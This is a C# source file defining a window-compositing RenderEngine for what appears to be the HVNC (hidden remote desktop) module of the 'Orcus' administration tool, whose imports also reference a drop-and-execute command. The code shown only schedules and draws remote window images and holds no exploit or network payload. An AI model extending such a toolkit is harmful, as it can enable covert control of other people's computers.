#if DEBUG
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.Native;
using Orcus.Shared.Commands.DropAndExecute;
using Orcus.Shared.Commands.HVNC;
using WindowUpdate = Orcus.Shared.Commands.HVNC.WindowUpdate;

namespace Orcus.Administration.Commands.HVNC
{
    public class RenderEngine : IDisposable
    {
        private readonly RequestInformationDelegate _requestInformationDelegate;
        private readonly object _listLock = new object();
        private readonly object _renderLock = new object();
        private readonly object _renderProcessLock = new object();

        private bool _isDisposed;
        private readonly AutoResetEvent _updateReceivedAutoResetEvent;

        public delegate void RequestInformationDelegate(Int64 windowToRender);

        public RenderEngine(int screenWidth, int screenHeight, RequestInformationDelegate requestInformationDelegate)
        {
            ScreenWidth = screenWidth;
            ScreenHeight = screenHeight;
            _requestInformationDelegate = requestInformationDelegate;
            Windows = new List<WindowRenderInfo>();
            _updateReceivedAutoResetEvent = new AutoResetEvent(false);

            Application.Current.Dispatcher.Invoke(() =>
            {
                WriteableBitmap = new WriteableBitmap(screenWidth, screenHeight, 96, 96,
                    PixelFormats.Bgr24, null);
            });
        }

        public void Dispose()
        {
            if (_isDisposed)
                return;

            _isDisposed = true;

            IsStarted = false;

            lock (_listLock)
            {
                foreach (var windowRenderInfo in Windows)
                    windowRenderInfo.Dispose();
                Windows.Clear();
            }

            _updateReceivedAutoResetEvent.Dispose();
        }

        public event EventHandler<double> FrameRatePerSecondUpdate;

        public List<WindowRenderInfo> Windows { get; private set; }
        public WriteableBitmap WriteableBitmap { get; private set; }
        public bool IsStarted { get; private set; }
        public int ScreenWidth { get; }
        public int ScreenHeight { get; }

        public void Start()
        {
            if (IsStarted)
                return;

            IsStarted = true;
            RenderLoop();
        }

        public void Stop()
        {
            if (!IsStarted)
                return;

            lock (_renderProcessLock)
                lock (_renderLock)
                    IsStarted = false;
        }

        private async void RenderLoop()
        {
            var priorityList = new Dictionary<WindowRenderInfo, int>();
            var stopwatch = Stopwatch.StartNew();
            var framesRendered = 0d;
            while (IsStarted)
            {
                lock (_renderProcessLock)
                {
                    priorityList.Clear();
                    lock (_listLock)
                    {
                        var now = DateTime.Now;
                        var visibleWindows = Windows.Where(x => x.Height > 0 && x.Width > 0).ToList();
                        for (int i = 0; i < visibleWindows.Count; i++)
                        {
                            var window = visibleWindows[i];
                            if (i == 0) //foreground window should be redrawn as often as possible
                            {
                                priorityList.Add(window, 1);
                                continue;
                            }

                            //if the window is the second or third window in z order, update all 5 seconds
                            //update all windows at least every 30 seconds if they're not in the top 3.
                            //windows which have a lower Z index (and are more visible) get have a higher priority
                            if ((now - window.LastUpdate).TotalSeconds > (i < 4 ? 8 : 14) ||
                                window.LastUpdate == DateTime.MinValue && !priorityList.ContainsKey(window))
                                priorityList.Add(window, (visibleWindows.Count - i)*5);
                        }
                    }

                    var windowToRender = priorityList.OrderByDescending(x => x.Value).FirstOrDefault().Key;
                    _requestInformationDelegate(windowToRender?.Handle ?? 0L);
                }

                try
                {
                    if (!await Task.Run(() => _updateReceivedAutoResetEvent.WaitOne()))
                        continue;
                }
                catch (Exception)
                {
                    continue;
                }

                if (!IsStarted)
                    return;

                RenderFrame();
                framesRendered++;

                if (stopwatch.ElapsedMilliseconds > 1000)
                {
                    FrameRatePerSecondUpdate?.Invoke(this,
                        framesRendered / (stopwatch.ElapsedMilliseconds / 1000d));
                    framesRendered = 0;
                    stopwatch.Restart();
                }
            }
        }

        private void RenderFrame()
        {
            lock (_renderLock)
            {
                using (var finalImage = new Bitmap(ScreenWidth, ScreenHeight))
                using (var graphics = Graphics.FromImage(finalImage))
                {
                    lock (_listLock)
                        for (int i = Windows.Count - 1; i-- > 0;)
                        {
                            var window = Windows[i];
                            if (window.Image != null)
                            {
                                lock (window.RenderLock)
                                    graphics.DrawImage(window.Image, new System.Drawing.Point(window.X, window.Y));
                            }
                        }

                    var bitmapData = finalImage.LockBits(new Rectangle(0, 0, finalImage.Width, finalImage.Height),
                        ImageLockMode.ReadOnly,
                        System.Drawing.Imaging.PixelFormat.Format24bppRgb);

                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        WriteableBitmap.Lock();
                        NativeMethods.CopyMemory(WriteableBitmap.BackBuffer, bitmapData.Scan0,
                            WriteableBitmap.BackBufferStride*finalImage.Height);

                        WriteableBitmap.AddDirtyRect(new Int32Rect(0, 0, finalImage.Width, finalImage.Height));
                        WriteableBitmap.Unlock();
                    });

                    finalImage.UnlockBits(bitmapData);
                }
            }
        }

        public void UpdateFailed()
        {
            if (_isDisposed)
                return;

            _updateReceivedAutoResetEvent.Set();
        }

        public void Update(WindowUpdate windowUpdate)
        {
            if (_isDisposed)
                return;

            lock (_listLock)
            {
                foreach (var windowInformation in windowUpdate.UpdatedWindows)
                    Windows.FirstOrDefault(x => x.Handle == windowInformation.Handle)?.UpdateData(windowInformation);

                foreach (var windowInformation in windowUpdate.NewWindows)
                    if (Windows.All(x => x.Handle != windowInformation.Handle))
                        Windows.Add(new WindowRenderInfo(windowInformation));

                foreach (var windowToRemove in Windows.Where(x => !windowUpdate.AllWindows.Contains(x.Handle)).ToList()) //ToList is important to allow removing from the list
                    Windows.Remove(windowToRemove);

                Windows =
                    new List<WindowRenderInfo>(windowUpdate.AllWindows.Where(
                        x => Windows.Any(y => y.Handle == x))
                        .Select(x => Windows.FirstOrDefault(y => y.Handle == x)));
                /*var windowsIndex = 0;
                for (int i = 0; i < windowUpdate.AllWindows.Count; i++)
                {
                    var windowHandle = windowUpdate.AllWindows[i];
                    var existingWindow = Windows.FirstOrDefault(x => x.Handle == windowHandle);
                    if (existingWindow == null)
#if DEBUG
                        throw new Exception("Window does not exist");
#else
                        continue;
#endif

                    Windows.Move(Windows.IndexOf(existingWindow), windowsIndex);
                    windowsIndex++;
                }*/

                if (windowUpdate.RenderedWindow != null)
                {
                    var windowToUpdate = Windows.FirstOrDefault(x => x.Handle == windowUpdate.RenderedWindowHandle);
                    windowToUpdate?.UpdateImage(windowUpdate.RenderedWindow);
                }
            }

            _updateReceivedAutoResetEvent.Set();
        }
    }
}
#endif